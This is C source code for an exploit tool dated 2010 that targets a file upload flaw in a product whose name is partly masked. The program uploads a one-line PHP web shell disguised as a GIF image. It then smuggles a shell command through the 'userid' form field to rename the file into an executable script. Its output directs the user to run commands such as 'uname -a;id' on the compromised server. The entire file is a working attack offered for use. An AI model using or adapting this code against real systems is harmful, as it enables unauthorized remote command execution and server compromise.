#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <netdb.h>
#include <getopt.h>
#include <sys/socket.h>

#define BANNER  \
"  - A****** <= v4.2.0.9 (build 10067) File Upload Vulnerability Exploit -\n"\
"                                                                  2010.10\n" \
"Author: 1ndr4, fr33b34r\n\n" \

#define BD		"--bd"
#define PHPCODE		"<? system($c); ?>"
#define IMAGENAME	"a.gif"
#define PHPNAME		"a.php"
#define FILEPATH	"/****/upload.php"
#define SAVEPATH	"/var/www/****/*******"

void usage(const char *);
void *make_header(const char *, unsigned int);
void *make_form_data(const char *);
int socket_set(const char *, unsigned short port);
int upload_data(int, const char *, const char *);

int main(int argc, char **argv)
{
	int s = 0;
	char *host = NULL;
	unsigned short port = 80;
	char *upfile_name = "a";
	char buf[1024];
	char *header = NULL, *form_data = NULL;

	fprintf(stdout, "%s", BANNER);

	if(argc < 2) {
		usage(argv[0]);
	}

	host = argv[1];
	if(argv[2] != NULL)
		port = atoi(argv[2]);
	fprintf(stdout, "[*] Target: %s, Port: %d\n", host, port);
	form_data = make_form_data(upfile_name);
	header = make_header(host, strlen(form_data));
	fprintf(stdout, "[*] Implementing the data..... ok!\n");
	
	if((s = socket_set(host, port)) < 0) {
		fprintf(stderr, "[!] Socket create error\n");
	}

	fprintf(stdout, "[*] Upload the data..... ");
	if(upload_data(s, header, form_data) < 0) {
		goto failed;
	}
	close(s);
	
	snprintf(buf, sizeof(buf), "; mv %s/%s %s/%s;",
		SAVEPATH, IMAGENAME, SAVEPATH, PHPNAME);
	form_data = make_form_data(buf);
	header = make_header(host, strlen(form_data));
	
	fprintf(stdout, "[*] Sending payload..... ");
	if((s = socket_set(host, port)) < 0) {
		fprintf(stdout, "failed!\n");
		goto failed;
	}
	if(upload_data(s, header, form_data) < 0) {
		goto failed;
	}
	close(s);
	fprintf(stdout, 
		"[*] Exploit executed successfully.\n"
		"[*] You visit, http://%s:%d/*******/%s?c=uname -a;id\n", 
		host, port, PHPNAME);

	return 0; 

failed:
	fprintf(stdout, "[!] Exploit Failed!\n");
	if(s > 0)
		close(s);
	return -1;
}

void usage(const char *prog)
{
	fprintf(stdout, 
		"Usage: %s <Host> <Port (Default: 80)>\n"
		"Ex) %s 127.0.0.1\n"
		"    %s 127.0.0.1 8080\n", prog, prog, prog);
	exit(0);
}

void *make_header(const char *host, unsigned int cl)
{
	static char ret[1024];

	snprintf(ret, sizeof(ret),
		"POST %s HTTP/1.0\r\n"
		"Host: %s\r\n"
		"User-Agent: A****** <= v4.1.5.2 (build 8255) "
		"File Upload Vulnerability PoC Code\r\n"
		"Content-Type: multipart/form-data; boundary=%s\r\n"
		"Content-Length: %d\r\n\r\n", FILEPATH, host, BD, cl);
	return &ret;
}

void *make_form_data(const char *var)
{
	static char ret[1024];
	
	snprintf(ret, sizeof(ret),
		"--%s\r\n"
		"Content-Disposition: form-data; name=\"file\"; filename=\"a.gif\"\r\n"
		"Content-Type: text/plain\r\n\r\n%s\r\n"
		"--%s\r\n"
		"Content-Disposition: form-data; name=\"userid\"\r\n\r\n"
		"%s\r\n"
		"--%s--\r\n", BD, PHPCODE, BD, var, BD);
	return ret;
}

int socket_set(const char *host, unsigned short port)
{
	int s = 0;
	struct sockaddr_in sin;
	struct hostent *he = NULL;

	if((he = gethostbyname(host)) == NULL) {
		fprintf(stderr, "[!] gethostbyname() function error\n");
		return -1;
	}

	if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		fprintf(stderr, "[!] Socket Create Error\n");
		return -1;
	}

	memset(&sin, 0x00, sizeof(sin));
	memcpy(&sin.sin_addr, he->h_addr, he->h_length);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);

	if(connect(s, (struct sockaddr *)&sin, sizeof(sin)) != 0) {
		fprintf(stderr, "[!] Can't connect to server\n");
		close(s);
		return -1;
	}
	return s;
}

int upload_data(int s, const char *header, const char *form_data)
{
	int n = 0;
	char msg[1024];

	if(send(s, header, strlen(header), 0) < 0) {
		snprintf(msg, sizeof(msg), "[!] Header send error\n");
		goto failed;
	}
	if(send(s, form_data, strlen(form_data), 0) < 0) {
		snprintf(msg, sizeof(msg), "[!] Form-data send error\n");
		goto failed;
	}

	while(1) {
		n = recv(s, msg, sizeof(msg), 0);
		if(n == 0) {
			break;
		} else if(n == -1) {
			snprintf(msg, sizeof(msg), "[!] Response data receive error\n");
			goto failed;
		}
	}

	fprintf(stdout, "ok!\n");
	return 0;
failed:
	fprintf(stdout, "failed!\n");
	fprintf(stderr, "%s", msg);
	return -1;
}

